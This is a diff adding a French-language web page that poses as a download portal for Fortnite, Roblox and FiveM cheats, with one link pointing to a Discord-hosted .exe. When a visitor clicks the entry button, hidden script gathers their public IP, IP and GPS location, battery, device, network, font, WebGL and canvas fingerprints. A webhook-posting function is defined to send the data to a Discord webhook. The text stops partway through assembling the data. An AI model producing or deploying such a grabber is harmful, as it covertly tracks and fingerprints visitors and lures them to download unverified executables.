@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Collecte infos visiteurs</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden;
+      background: #000;
+      font-family: 'Courier New', monospace;
+      color: white;
+      text-align: center;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      height: 100%;
+      display: block;
+      pointer-events: none;
+      user-select: none;
+    }
+    #matrixLeft, #matrixRight {
+      width: 20%;
+      height: 100%;
+      top: 0;
+      z-index: 1;
+    }
+    #matrixLeft { left: 0; }
+    #matrixRight { right: 0; }
+    #starsCanvas {
+      position: fixed;
+      top: 0;
+      left: 20%;
+      width: 60%;
+      height: 100%;
+      z-index: 0;
+    }
+    .overlay {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60%;
+      height: 100%;
+      pointer-events: none;
+      user-select: none;
+      z-index: 2;
+    }
+    .title-top,
+    .title-bottom {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 110px;
+      letter-spacing: 0.3em;
+      margin: 0;
+      pointer-events: none;
+      user-select: none;
+      white-space: nowrap;
+      font-weight: bold;
+    }
+    .title-top { top: 10cm; }
+    .title-bottom { bottom: 10cm; }
+    .center-button {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, 0);
+      background-color: red;
+      color: white;
+      border: 2px solid white;
+      padding: 15px 35px;
+      font-size: 20px;
+      cursor: pointer;
+      z-index: 3;
+      text-shadow: 0 0 5px white;
+      user-select: none;
+      pointer-events: auto;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      white-space: nowrap;
+    }
+    .center-button:hover {
+      background-color: white;
+      color: red;
+    }
+    #infos {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      color: #0f0;
+      font-size: 16px;
+    }
+    /* Style pour la page des cheats */
+    .cheat-page {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      z-index: 1000;
+      overflow: auto;
+      padding: 20px;
+      box-sizing: border-box;
+      position: relative;
+    }
+    /* Étoiles néon pour le fond */
+    .neon-stars {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      pointer-events: none;
+    }
+    .neon-star {
+      position: absolute;
+      background: radial-gradient(circle, rgba(102, 255, 255, 0.8) 0%, rgba(102, 255, 255, 0) 70%);
+      border-radius: 50%;
+      animation: neon-pulse 2s infinite alternate;
+      box-shadow: 0 0 10px rgba(102, 255, 255, 0.7);
+    }
+    .neon-star::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 2px;
+      height: 2px;
+      background: white;
+      border-radius: 50%;
+    }
+    @keyframes neon-pulse {
+      0% {
+        opacity: 0.7;
+        transform: scale(1);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1.1);
+      }
+    }
+    /* Curseur personnalisé en croix rose */
+    .custom-cursor {
+      position: fixed;
+      width: 30px;
+      height: 30px;
+      pointer-events: none;
+      z-index: 1000;
+      transform: translate(-50%, -50%);
+    }
+    .custom-cursor::before,
+    .custom-cursor::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      background: #ff2d75;
+      border-radius: 2px;
+    }
+    .custom-cursor::before {
+      width: 20px;
+      height: 2px;
+      transform: translate(-50%, -50%);
+    }
+    .custom-cursor::after {
+      width: 2px;
+      height: 20px;
+      transform: translate(-50%, -50%);
+    }
+    .cheat-header {
+      font-size: 48px;
+      margin-top: 30px;
+      color: #ff2d75;
+      text-shadow: 0 0 10px #ff2d75;
+      animation: pulse 2s infinite alternate;
+      position: relative;
+      z-index: 1;
+    }
+    .cheat-categories {
+      display: flex;
+      justify-content: center;
+      gap: 50px;
+      margin-top: 50px;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 1;
+    }
+    .cheat-category {
+      background: rgba(20, 20, 20, 0.7);
+      border: 2px solid #ff2d75;
+      border-radius: 10px;
+      padding: 30px;
+      width: 380px;
+      height: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px rgba(255, 45, 117, 0.3);
+      backdrop-filter: blur(5px);
+    }
+    .cheat-category:hover {
+      background: rgba(255, 45, 117, 0.1);
+      transform: translateY(-5px);
+    }
+    .cheat-category img {
+      width: 100%;
+      height: 240px;
+      object-fit: cover;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      border: 1px solid #ff2d75;
+    }
+    .cheat-category h2 {
+      color: #ff2d75;
+      font-size: 28px;
+      margin: 0;
+    }
+    .download-link {
+      display: block;
+      margin-top: 15px;
+      color: #00ffff;
+      text-decoration: none;
+      font-size: 16px;
+      transition: color 0.3s ease;
+    }
+    .download-link:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+    .created-by {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: #aaa;
+      font-size: 14px;
+      text-align: center;
+      width: 100%;
+      z-index: 1;
+    }
+    @keyframes pulse {
+      from { text-shadow: 0 0 10px #ff2d75; }
+      to { text-shadow: 0 0 25px #ff2d75, 0 0 30px #ff2d75; }
+    }
+    /* Page de redirection */
+    .redirect-page {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      z-index: 2000;
+      overflow: hidden;
+      padding: 20px;
+      box-sizing: border-box;
+      text-align: center;
+      color: white;
+      font-family: 'Courier New', monospace;
+    }
+    .redirect-content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+    }
+    .redirect-title {
+      font-size: 36px;
+      color: #ff2d75;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #ff2d75;
+    }
+    .redirect-message {
+      font-size: 20px;
+      color: #aaa;
+      margin-bottom: 30px;
+    }
+    .redirect-timer {
+      font-size: 24px;
+      color: #00ffff;
+      font-weight: bold;
+    }
+    /* Barre de volume */
+    .volume-control {
+      position: absolute;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      z-index: 2001;
+    }
+    .volume-icon {
+      color: #00ffff;
+      font-size: 20px;
+      cursor: pointer;
+    }
+    .volume-slider {
+      width: 150px;
+      height: 5px;
+      -webkit-appearance: none;
+      appearance: none;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 5px;
+      outline: none;
+      cursor: pointer;
+    }
+    .volume-slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background: #00ffff;
+      cursor: pointer;
+    }
+    .volume-slider::-moz-range-thumb {
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background: #00ffff;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="matrixLeft"></canvas>
+  <canvas id="matrixRight"></canvas>
+  <canvas id="starsCanvas"></canvas>
+  <div class="overlay">
+    <div class="title-top">NO NAME6</div>
+    <div class="title-bottom">NO NAME9</div>
+  </div>
+  <button class="center-button" id="enterButton">Clique ici pour entrer</button>
+  <div id="infos"></div>
+  <!-- Page des cheats (cachée au début) -->
+  <div class="cheat-page" id="cheatPage">
+    <div class="neon-stars" id="neonStars"></div>
+    <div class="custom-cursor" id="customCursor"></div>
+    <h1 class="cheat-header">🎮 Les Cheats</h1>
+    <div class="cheat-categories">
+      <div class="cheat-category">
+        <img src="images/fortnite.jpg" alt="Fortnite">
+        <h2>Cheat - Fortnite</h2>
+        <a href="#" class="download-link" data-url="https://gofile.io/d/JAtR5r" target="_blank">Lien de téléchargement</a>
+      </div>
+      <div class="cheat-category">
+        <img src="images/roblox.jpg" alt="Roblox">
+        <h2>Cheat - Roblox</h2>
+        <a href="#" class="download-link" data-url="https://gofile.io/d/2L8xBf" target="_blank">Lien de téléchargement</a>
+      </div>
+      <div class="cheat-category">
+        <img src="images/fivem.jpg" alt="FiveM">
+        <h2>Cheat - FiveM</h2>
+        <a href="#" class="download-link" data-url="https://cdn.discordapp.com/attachments/1376243443277234269/1377119056024572006/Hul1ygW7XFRq.exe?ex=68cd6fd0&is=68cc1e50&hm=d2830f4d3eec42185600ec6c39d0ea0a6cbd601f591a861d3915cd7492571740&" target="_blank">Lien de téléchargement</a>
+      </div>
+    </div>
+    <div class="created-by">
+      Created by 96
+    </div>
+  </div>
+  <!-- Page de redirection -->
+  <div class="redirect-page" id="redirectPage">
+    <div class="neon-stars" id="redirectNeonStars"></div>
+    <div class="redirect-content">
+      <h1 class="redirect-title">Redirection en cours...</h1>
+      <p class="redirect-message">Vous allez être redirigé vers la page dans <span class="redirect-timer" id="redirectTimer">25</span> secondes.</p>
+    </div>
+    <div class="volume-control">
+      <span class="volume-icon">🔊</span>
+      <input type="range" min="0" max="1" step="0.01" value="0.7" class="volume-slider" id="volumeSlider">
+    </div>
+    <audio id="redirectMusic" loop>
+      <source src="music.mp3" type="audio/mpeg">
+      <source src="music.mp4" type="audio/mp4">
+      Votre navigateur ne supporte pas l'élément audio.
+    </audio>
+  </div>
+  <script>
+    // Génération des étoiles néon pour le fond
+    function createNeonStars(containerId) {
+      const container = document.getElementById(containerId);
+      const starCount = 300;
+      for (let i = 0; i < starCount; i++) {
+        const star = document.createElement('div');
+        star.classList.add('neon-star');
+        const size = Math.random() * 5 + 1;
+        const top = Math.random() * 100;
+        const left = Math.random() * 100;
+        // Couleurs néon variées
+        const colors = [
+          'rgba(102, 255, 255, 0.8)', // Cyan
+          'rgba(255, 102, 255, 0.8)', // Rose
+          'rgba(204, 102, 255, 0.8)', // Violet
+          'rgba(102, 204, 255, 0.8)', // Bleu clair
+          'rgba(255, 255, 102, 0.8)'  // Jaune
+        ];
+        const color = colors[Math.floor(Math.random() * colors.length)];
+        star.style.width = `${size}px`;
+        star.style.height = `${size}px`;
+        star.style.top = `${top}%`;
+        star.style.left = `${left}%`;
+        star.style.background = `radial-gradient(circle, ${color} 0%, ${color.replace('0.8', '0')} 70%)`;
+        star.style.animationDuration = `${Math.random() * 4 + 1}s`;
+        container.appendChild(star);
+      }
+    }
+
+    // Curseur personnalisé en croix rose
+    function setupCustomCursor() {
+      const cursor = document.getElementById('customCursor');
+      document.addEventListener('mousemove', (e) => {
+        cursor.style.left = `${e.clientX}px`;
+        cursor.style.top = `${e.clientY}px`;
+      });
+    }
+
+    // Gestion des liens de téléchargement
+    function setupDownloadLinks() {
+      const links = document.querySelectorAll('.download-link');
+      const redirectPage = document.getElementById('redirectPage');
+      const redirectTimer = document.getElementById('redirectTimer');
+      const redirectMusic = document.getElementById('redirectMusic');
+      const volumeSlider = document.getElementById('volumeSlider');
+      // Variable pour stocker l'URL de redirection
+      let currentRedirectUrl = '';
+      // Contrôle du volume
+      volumeSlider.addEventListener('input', function() {
+        redirectMusic.volume = this.value;
+      });
+      links.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          currentRedirectUrl = link.getAttribute('data-url');
+          // Afficher la page de redirection
+          redirectPage.style.display = 'block';
+          createNeonStars('redirectNeonStars');
+          // Lancer la musique
+          redirectMusic.currentTime = 0;
+          redirectMusic.volume = volumeSlider.value;
+          redirectMusic.play().catch(error => {
+            console.log("La lecture automatique a été bloquée :", error);
+          });
+          // Compte à rebours (25 secondes)
+          let count = 25;
+          redirectTimer.textContent = count;
+          const timer = setInterval(() => {
+            count--;
+            redirectTimer.textContent = count;
+            if (count <= 0) {
+              clearInterval(timer);
+              // Redirection directe vers l'URL
+              window.location.href = currentRedirectUrl;
+              redirectPage.style.display = 'none';
+              redirectMusic.pause();
+            }
+          }, 1000);
+        });
+      });
+    }
+
+    // Appel des fonctions
+    document.addEventListener('DOMContentLoaded', function() {
+      createNeonStars('neonStars');
+      setupCustomCursor();
+      setupDownloadLinks();
+    });
+
+    // ---------- Effets graphiques ----------
+    const starsCanvas = document.getElementById('starsCanvas');
+    const starsCtx = starsCanvas.getContext('2d');
+    function resizeStars() {
+      starsCanvas.width = window.innerWidth * 0.6;
+      starsCanvas.height = window.innerHeight;
+    }
+    resizeStars();
+    window.addEventListener('resize', resizeStars);
+    class Star {
+      constructor(color) {
+        this.x = Math.random() * starsCanvas.width;
+        this.y = Math.random() * starsCanvas.height;
+        this.radius = Math.random() * 1.5 + 0.5;
+        this.brightness = Math.random() * 0.5 + 0.5;
+        this.brightnessChange = (Math.random() * 0.02 + 0.005) * (Math.random() < 0.5 ? 1 : -1);
+        this.color = color;
+      }
+      update() {
+        this.brightness += this.brightnessChange;
+        if (this.brightness <= 0.5 || this.brightness >= 1) this.brightnessChange *= -1;
+      }
+      draw() {
+        starsCtx.beginPath();
+        starsCtx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+        starsCtx.fillStyle = `rgba(${this.color},${this.brightness})`;
+        starsCtx.shadowColor = `rgba(${this.color},${this.brightness})`;
+        starsCtx.shadowBlur = 8;
+        starsCtx.fill();
+      }
+    }
+    const pink = '255,20,147';
+    const white = '255,255,255';
+    const stars = [];
+    for (let i = 0; i < 200; i++) stars.push(new Star(pink));
+    for (let i = 0; i < 100; i++) stars.push(new Star(white));
+    function animateStars() {
+      starsCtx.clearRect(0, 0, starsCanvas.width, starsCanvas.height);
+      stars.forEach(s => { s.update(); s.draw(); });
+      requestAnimationFrame(animateStars);
+    }
+    animateStars();
+    // Colonnes Matrix
+    function setupMatrix(canvas, colors) {
+      const ctx = canvas.getContext('2d');
+      const fontSize = 12;
+      let columns;
+      let drops;
+      const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&';
+      function resize() {
+        canvas.width = canvas.offsetWidth;
+        canvas.height = window.innerHeight;
+        columns = Math.floor(canvas.width / fontSize);
+        drops = new Array(columns).fill(1);
+      }
+      function draw() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.font = fontSize + 'px monospace';
+        for (let i = 0; i < drops.length; i++) {
+          const text = chars.charAt(Math.floor(Math.random() * chars.length));
+          const x = i * fontSize;
+          const y = drops[i] * fontSize;
+          ctx.fillStyle = colors[i % colors.length];
+          ctx.fillText(text, x, y);
+          if (y > canvas.height && Math.random() > 0.975) {
+            drops[i] = 0;
+          }
+          drops[i] += 0.5;
+        }
+      }
+      function loop() {
+        draw();
+        requestAnimationFrame(loop);
+      }
+      resize();
+      window.addEventListener('resize', resize);
+      loop();
+    }
+    setupMatrix(document.getElementById('matrixLeft'), ['rgb(0, 191, 255)', 'rgb(255, 255, 255)']);
+    setupMatrix(document.getElementById('matrixRight'), ['rgb(255, 20, 147)', 'rgb(255, 105, 180)']);
+    // Animation NO NAME color
+    const topTitle = document.querySelector('.title-top');
+    const bottomTitle = document.querySelector('.title-bottom');
+    let colorPhase = 0;
+    function lerpColor(a, b, t) {
+      return a.map((v, i) => Math.round(v + (b[i] - v) * t));
+    }
+    function rgbString(arr) {
+      return `rgb(${arr[0]},${arr[1]},${arr[2]})`;
+    }
+    function animateNoName() {
+      const t = (Math.sin(colorPhase * Math.PI * 2) + 1) / 2;
+      const color = lerpColor([255, 255, 255], [0, 191, 255], t);
+      const css = rgbString(color);
+      [topTitle, bottomTitle].forEach(el => {
+        el.style.color = css;
+        el.style.textShadow = `0 0 10px ${css}, 0 0 20px ${css}`;
+      });
+      colorPhase += 0.01;
+      requestAnimationFrame(animateNoName);
+    }
+    animateNoName();
+    // Fonction envoi webhook Discord
+    async function sendWebhook(url, data) {
+      try {
+        let response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+        });
+        if (!response.ok) throw new Error('Réponse non OK ' + response.status);
+        return { success: true };
+      } catch (err) {
+        console.error('Erreur envoi webhook:', err.message);
+        return { success: false, error: err.message };
+      }
+    }
+    // Fonction pour extraire version navigateur simple
+    function parseBrowserVersion(userAgent) {
+      const ua = userAgent.toLowerCase();
+      let match = ua.match(/(firefox|chrome|safari|opr|edg|msie|trident(?=\/))\/?\s*(\d+)/) || [];
+      if (/trident/.test(match[1])) {
+        const rv = ua.match(/\brv[ :]+(\d+)/g) || [];
+        return 'IE ' + (rv[1] || '');
+      }
+      if (match[1] === 'opr') return 'Opera ' + match[2];
+      if (match[1] === 'edg') return 'Edge ' + match[2];
+      return match.length > 2 ? `${match[1]} ${match[2]}` : 'Inconnu';
+    }
+    // NOUVELLES FONCTIONS POUR COLLECTER PLUS DE DONNÉES
+    async function getIPGeolocation(ip) {
+      try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        if (!response.ok) throw new Error("Service indisponible");
+        const data = await response.json();
+        return {
+          ville: data.city || "Inconnue",
+          region: data.region || "Inconnue",
+          pays: data.country_name || "Inconnu",
+          code_pays: data.country_calling_code || "N/A",
+          latitude: data.latitude || "N/A",
+          longitude: data.longitude || "N/A",
+          fuseau_horaire: data.timezone || "N/A",
+          devise: data.currency || "N/A",
+          isp: data.org || "Inconnu",
+          asn: data.asn || "N/A",
+          proxy: data.proxy ? "Oui" : "Non",
+          hosting: data.hosting ? "Oui" : "Non"
+        };
+      } catch (err) {
+        return { error: "Localisation IP indisponible" };
+      }
+    }
+    async function getGeolocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({error: "Geolocation non supportée"});
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy + " mètres",
+              timestamp: new Date(pos.timestamp).toString()
+            });
+          },
+          (err) => {
+            resolve({error: "Permission refusée ou erreur géoloc"});
+          },
+          {timeout: 10000}
+        );
+      });
+    }
+    async function getBatteryInfo() {
+      if (!navigator.getBattery) return { error: "API batterie non supportée" };
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          niveau: (battery.level * 100).toFixed(2) + "%",
+          en_charge: battery.charging ? "Oui" : "Non",
+          temps_charge: battery.chargingTime ? (battery.chargingTime / 60).toFixed(1) + " min" : "N/A",
+          temps_decharge: battery.dischargingTime ? (battery.dischargingTime / 60).toFixed(1) + " min" : "N/A"
+        };
+      } catch (e) {
+        return { error: "Impossible de récupérer les infos batterie" };
+      }
+    }
+    function getDeviceInfo() {
+      const info = {
+        memoire: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
+        cores: navigator.hardwareConcurrency || "Non disponible",
+        architecture: navigator.userAgentData?.platform || "Non disponible",
+        model: navigator.userAgentData?.model || "Non disponible",
+        mobile: navigator.userAgentData?.mobile ? "Oui" : "Non",
+        max_touch_points: navigator.maxTouchPoints || "Non disponible",
+        orientation: screen.orientation?.type || "Non disponible",
+        pixel_ratio: window.devicePixelRatio || "Non disponible",
+        couleur_profondeur: screen.colorDepth + " bits",
+        resolution: `${screen.width}x${screen.height}`,
+        resolution_disponible: `${screen.availWidth}x${screen.availHeight}`,
+        time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Non disponible"
+      };
+      // Détection des capteurs
+      info.capteurs = {
+        accelerometre: 'DeviceMotionEvent' in window ? "Oui" : "Non",
+        gyroscope: 'DeviceOrientationEvent' in window ? "Oui" : "Non",
+        luminosite: 'AmbientLightSensor' in window ? "Oui" : "Non",
+        proximite: 'ProximitySensor' in window ? "Oui" : "Non"
+      };
+      return info;
+    }
+    function getNetworkInfo() {
+      const connection = navigator.connection || {};
+      return {
+        en_ligne: navigator.onLine ? "Oui" : "Non",
+        type_reseau: connection.effectiveType || "Non disponible",
+        debit_descendant: connection.downlink ? connection.downlink + " Mbps" : "Non disponible",
+        rtt: connection.rtt ? connection.rtt + " ms" : "Non disponible",
+        sauvegarde_donnees: connection.saveData ? "Oui" : "Non",
+        downlink_max: connection.downlinkMax ? connection.downlinkMax + " Mbps" : "Non disponible",
+        connection_type: connection.type || "Non disponible"
+      };
+    }
+    function getStorageInfo() {
+      return {
+        cookies: navigator.cookieEnabled ? "Activés" : "Désactivés",
+        local_storage: (() => {
+          try { localStorage.setItem('test', '1'); localStorage.removeItem('test'); return "Disponible"; }
+          catch { return "Indisponible"; }
+        })(),
+        session_storage: (() => {
+          try { sessionStorage.setItem('test', '1'); sessionStorage.removeItem('test'); return "Disponible"; }
+          catch { return "Indisponible"; }
+        })(),
+        indexdb: (() => {
+          try { return 'indexedDB' in window ? "Disponible" : "Indisponible"; }
+          catch { return "Indisponible"; }
+        })(),
+        cache_api: 'caches' in window ? "Disponible" : "Indisponible",
+        service_workers: 'serviceWorker' in navigator ? "Disponible" : "Indisponible"
+      };
+    }
+    function getSecurityInfo() {
+      return {
+        protocol: window.location.protocol,
+        ssl: window.location.protocol === "https:" ? "Oui (HTTPS)" : "Non (HTTP)",
+        referrer_policy: document.referrerPolicy || "Non spécifiée",
+        content_security: (() => {
+          const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+          return meta ? meta.content : "Non spécifiée";
+        })(),
+        xss_protection: (() => {
+          const meta = document.querySelector('meta[http-equiv="X-XSS-Protection"]');
+          return meta ? meta.content : "Non spécifiée";
+        })(),
+        crypto: 'crypto' in window ? "Web Crypto API disponible" : "Non disponible"
+      };
+    }
+    function getPerformanceInfo() {
+      const [timing, navigation] = [performance.timing, performance.navigation];
+      return {
+        temps_chargement: timing.loadEventEnd - timing.navigationStart || "N/A",
+        temps_dom: timing.domComplete - timing.domLoading || "N/A",
+        temps_dns: timing.domainLookupEnd - timing.domainLookupStart || "N/A",
+        temps_tcp: timing.connectEnd - timing.connectStart || "N/A",
+        temps_request: timing.responseEnd - timing.requestStart || "N/A",
+        type_navigation: navigation.type === 0 ? "Normal" :
+                         navigation.type === 1 ? "Rafraîchissement" :
+                         navigation.type === 2 ? "Retour/avant" : "Inconnu",
+        redirect_count: navigation.redirectCount || "Aucun"
+      };
+    }
+    function getMediaInfo() {
+      return {
+        audio: (() => {
+          const audio = new Audio();
+          return {
+            mp3: audio.canPlayType('audio/mpeg') || "Non",
+            ogg: audio.canPlayType('audio/ogg') || "Non",
+            wav: audio.canPlayType('audio/wav') || "Non"
+          };
+        })(),
+        video: (() => {
+          const video = document.createElement('video');
+          return {
+            mp4: video.canPlayType('video/mp4') || "Non",
+            webm: video.canPlayType('video/webm') || "Non",
+            ogg: video.canPlayType('video/ogg') || "Non"
+          };
+        })(),
+        codecs: (() => {
+          const codecs = [];
+          if ('MediaRecorder' in window && MediaRecorder.isTypeSupported) {
+            ['video/webm', 'video/webm;codecs=vp9', 'video/mp4', 'audio/webm', 'audio/mp4'].forEach(type => {
+              try {
+                codecs.push(`${type}: ${MediaRecorder.isTypeSupported(type) ? "Oui" : "Non"}`);
+              } catch {}
+            });
+          }
+          return codecs.length ? codecs.join(', ') : "API non supportée";
+        })(),
+        devices: (() => {
+          try {
+            return navigator.mediaDevices ? "API disponible" : "API non disponible";
+          } catch {
+            return "Accès refusé";
+          }
+        })()
+      };
+    }
+    function getFontInfo() {
+      const fonts = [
+        'Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana',
+        'Helvetica', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS',
+        'Arial Black', 'Impact', 'Lucida Console', 'Tahoma', 'Monospace'
+      ];
+      const detected = [];
+      const baseFont = 'monospace';
+      const testString = "mmmmmmmmmmwwwwwwwwww";
+      const testSize = '100px';
+      const baseWidth = getTextWidth(testString, baseFont, testSize);
+      fonts.forEach(font => {
+        try {
+          const width = getTextWidth(testString, font, testSize);
+          if (width !== baseWidth) detected.push(font);
+        } catch {}
+      });
+      function getTextWidth(text, font, size) {
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        context.font = `${size} ${font}`;
+        return context.measureText(text).width;
+      }
+      return {
+        polices_detectees: detected.join(', ') || "Aucune",
+        total_testes: fonts.length,
+        api_fonts: 'fonts' in document ? "Disponible" : "Non disponible"
+      };
+    }
+    function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { error: "WebGL non supporté" };
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL) || "Inconnu";
+        const renderer = gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL) || "Inconnu";
+        return {
+          vendor: vendor,
+          renderer: renderer,
+          shading_language: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+          max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+          max_viewport_dims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+          antialias: gl.getContextAttributes().antialias ? "Oui" : "Non"
+        };
+      } catch (e) {
+        return { error: "Impossible de récupérer les infos WebGL" };
+      }
+    }
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.textBaseline = "alphabetic";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("Cwm fjordbank glyphs vext quiz, \ud83d\ude03", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText("Cwm fjordbank glyphs vext quiz, \ud83d\ude03", 4, 17);
+        return canvas.toDataURL();
+      } catch (e) {
+        return "Impossible de générer l'empreinte canvas";
+      }
+    }
+    // Gestionnaire d'événement du bouton
+    document.getElementById('enterButton').addEventListener('click', async function () {
+      const infosDiv = document.getElementById('infos');
+      infosDiv.textContent = "Collecte des informations en cours...";
+
+      // Récupération de l'IP
+      let ip = "Non disponible";
+      try {
+        const resIP = await fetch('https://api.ipify.org?format=json');
+        const dataIP = await resIP.json();
+        ip = dataIP.ip || ip;
+      } catch (e) {
+        console.warn("Erreur récupération IP:", e);
+      }
+
+      // Récupération de toutes les informations en parallèle
+      const [
+        ipGeoloc,
+        geoloc,
+        batteryInfo,
+        deviceInfo,
+        networkInfo,
+        storageInfo,
+        securityInfo,
+        performanceInfo,
+        mediaInfo,
+        fontInfo,
+        webglInfo,
+        canvasFingerprint
+      ] = await Promise.allSettled([
+        getIPGeolocation(ip),
+        getGeolocation(),
+        getBatteryInfo(),
+        getDeviceInfo(),
+        getNetworkInfo(),
+        getStorageInfo(),
+        getSecurityInfo(),
+        getPerformanceInfo(),
+        getMediaInfo(),
+        getFontInfo(),
+        getWebGLInfo(),
+        getCanvasFingerprint()
+      ]).then(results => results.map(r => r.status === 'fulfilled' ? r.value : { error: r.reason.message || "Erreur inconnue" }));
+
+      // Récupération des performances
+      const perf = performance.timing;
+      const pageLoadTime = perf.loadEventEnd && perf.navigationStart ? perf.loadEventEnd - perf.navigationStart : "Non disponible";
+
+      // Construction de l'objet complet avec toutes les informations
+      const infos = {
+        // Informations de base
+        "IP Publique": ip,
+        "Localisation (IP)": ipGeoloc.error ? ipGeoloc.error :
+          `${ipGeoloc.ville}, ${ipGeoloc.region}, ${ipGeoloc.pays} (Lat: ${ipGeoloc.latitude}, Long: ${ipGeoloc.longitude}) - ${ipGeoloc.isp}`,
+        "Géolocalisation précise": geoloc.error ? geoloc.error :
+          `Latitude: ${geoloc.latitude}, Longitude: ${geoloc.longitude}, Précision: ${geoloc.accuracy}`,
+        // Informations navigateur
+        "User-Agent": navigator.userAgent,
+        "Version Navigateur": parseBrowserVersion(navigator.userAgent),
+        "Langue": navigator.language,
+        "Langues Acceptées": navigator.languages ? navigator.languages.join(', ') : "Non disponible",
+        "Plateforme": navigator.platform,
+        "Plugins installés": navigator.plugins.length > 0 ? [...navigator.plugins].map(p => p.name).join(', ') : "Aucun",
+        // Informations appareil
+        "📱 Appareil": `
+          Modèle: ${deviceInfo.model}
+          Architecture: ${deviceInfo.architecture}
+          Mobile: ${deviceInfo.mobile}
+          Mémoire: ${deviceInfo.memoire}
+          Cœurs CPU: ${deviceInfo.cores}
+          Touch Points: ${deviceInfo.max_touch_points}
+          Orientation: ${deviceInfo.orientation}
+          Pixel Ratio: ${deviceInfo.pixel_ratio}
+          Couleur: ${deviceInfo.couleur_profondeur}
+          Résolution: ${deviceInfo.resolution}
+          Fuseau horaire: ${deviceInfo.time_zone}
+          Capteurs:
+            Accélromètre: ${deviceInfo.capteurs.accelerometre}
+            Gyroscope: ${deviceInfo.capteurs.gyroscope}
+            Luminosité: ${deviceInfo.capteurs.luminosite}
+            Proximité: ${deviceInfo.capteurs.proximite}
+        `,
+        // Informations réseau
+        "🌐 Réseau": `
+          En ligne: ${networkInfo.en_ligne}
+          Type: ${networkInfo.type_reseau}
+          Débit: ${networkInfo.debit_descendant}
+          RTT: ${networkInfo.rtt}
+          Sauvegarde données: ${networkInfo.sauvegarde_donnees}
+          Type connexion: ${networkInfo.connection_type}
+          Proxy: ${ipGeoloc.proxy || "Non"}
+          Hosting: ${ipGeoloc.hosting || "Non"}
+        `,
+        // Informations batterie
+        "🔋 Batterie": batteryInfo.error ? batteryInfo.error : `
+          Niveau: ${batteryInfo.niveau}
+          En charge: ${batteryInfo.en_charge}
+          Temps charge: ${batteryInfo.temps_charge}
+          Temps décharge: ${batteryInfo.temps_decharge}
+        `,
+        // Informations stockage
+        "💾 Stockage": `
+          Cookies: ${storageInfo.cookies}
+          LocalStorage: ${storageInfo.local_storage}
+          SessionStorage: ${storageInfo.session_storage}
